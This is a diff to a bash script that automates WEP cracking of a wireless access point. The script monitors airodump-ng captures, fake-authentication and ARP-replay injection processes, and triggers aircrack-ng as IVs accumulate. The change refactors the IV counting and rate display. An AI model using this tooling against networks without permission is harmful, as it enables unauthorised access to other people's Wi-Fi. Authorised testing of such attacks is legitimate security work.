@@ -121,8 +121,15 @@ echo "[*] IVs: captured IVs. IV/s: new IVs per second. ARP req: ARP requests cap
 echo "    ACK: frames the AP acknowledged. TX: frames our card sent."
 echo "[*] Progress every ${RETRY_SECS}s. aircrack-ng tries the key at ${MIN_IVS} IVs, then every ${IV_TARGET} more."
 echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
+# #IV on the target AP's row of the airodump-ng CSV (0 until the first write).
+ap_ivs() {
+  local n
+  n=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "${OUT}-01.csv" 2>/dev/null)
+  echo "${n:-0}"
+}
 last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
-prev_iv=0                # #Data at the last progress line, for the rate
+prev_iv=$(ap_ivs)        # #Data at the last progress line, for the rate
+prev_time=$(date +%s.%N) # when that line was printed
 while true; do
   sleep "$RETRY_SECS"
   # A card reset or a stopped attack would otherwise leave the count frozen, so stop with the reason.
@@ -131,18 +138,16 @@ while true; do
     kill -0 "$fakeauth_pid" 2>/dev/null || die "fake auth stopped; see ${OUT}-fakeauth.txt"
     kill -0 "$arp_pid" 2>/dev/null || die "ARP replay stopped; see ${OUT}-arpreplay.txt"
   fi
-  CSV="${OUT}-01.csv"
-  ivs=0
-  if [[ -f "$CSV" ]]; then
-    # column 11 ("# IV") on the AP row matching our BSSID
-    ivs=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "$CSV")
-    ivs=${ivs:-0}
-  fi
+  ivs=$(ap_ivs)
   # Latest ARP replay counters, from the last status line aireplay-ng printed.
   replay=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'got ' | tail -n 1 |
     sed -E 's/.*got ([0-9]+) ARP requests and ([0-9]+) ACKs\), sent ([0-9]+) packets.*/ARP req \1, ACK \2, TX \3/')
-  echo "    $(date +%H:%M:%S)  IVs ${ivs} (+$(( (ivs - prev_iv) / RETRY_SECS )) IV/s)  ${replay}"
+  # The rate is per real second: a slow aircrack try can make the loop take longer than RETRY_SECS.
+  now=$(date +%s.%N)
+  rate=$(awk -v d="$((ivs - prev_iv))" -v a="$prev_time" -v b="$now" 'BEGIN { t = b - a; printf "%+d", (t > 0 ? d / t : 0) }')
+  echo "    $(date +%H:%M:%S)  IVs ${ivs} (${rate} IV/s)  ${replay}"
   prev_iv=$ivs
+  prev_time=$now
   # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
   if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
     last_iv=$ivs
